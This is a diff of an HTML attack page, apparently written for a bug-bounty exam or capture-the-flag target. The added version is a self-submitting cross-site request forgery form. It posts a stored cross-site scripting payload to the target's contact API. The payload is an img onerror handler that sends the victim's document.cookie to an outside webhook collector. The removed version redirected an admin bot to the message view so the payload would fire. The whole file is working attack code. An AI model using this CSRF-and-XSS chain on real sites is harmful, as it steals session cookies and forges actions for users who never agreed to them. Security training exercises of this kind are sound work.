@@ -1,17 +1,16 @@
-<!DOCTYPE html>
 <html>
-<head>
-    <title>Redirecting to Admin Portal</title>
-</head>
-<body>
+  <body>
+    <form action="https://api-bugbounty-exam.hashacademy.co/api/contact/submit" method="POST">
+      <input type="hidden" name="name" value="attacker">
+      <input type="hidden" name="email" value="attacker@test.com">
+      <input type="hidden" name="subject" value="XSS">
+      <input type="hidden" name="message" value="<img src=x onerror=fetch('https://webhooksite.net/74366b2e-d67d-466f-b06d-f011d3d7d349?c='+document.cookie)>">
+      <input type="hidden" name="category" value="general">
+      <input type="hidden" name="priority" value="high">
+    </form>
+
     <script>
-        // We are redirecting the bot to the internal admin view of your message
-        // This is where your <img src="...?leak=" tag will execute
-        const messageId = "69e22c68bee6d6b7c6628b2c";
-        const targetUrl = `https://bugbounty-exam.hashacademy.co/admin/messages/${messageId}`;
-        
-        console.log("Redirecting bot to secure message view...");
-        window.location.replace(targetUrl);
+      document.forms[0].submit();
     </script>
-</body>
+  </body>
 </html>
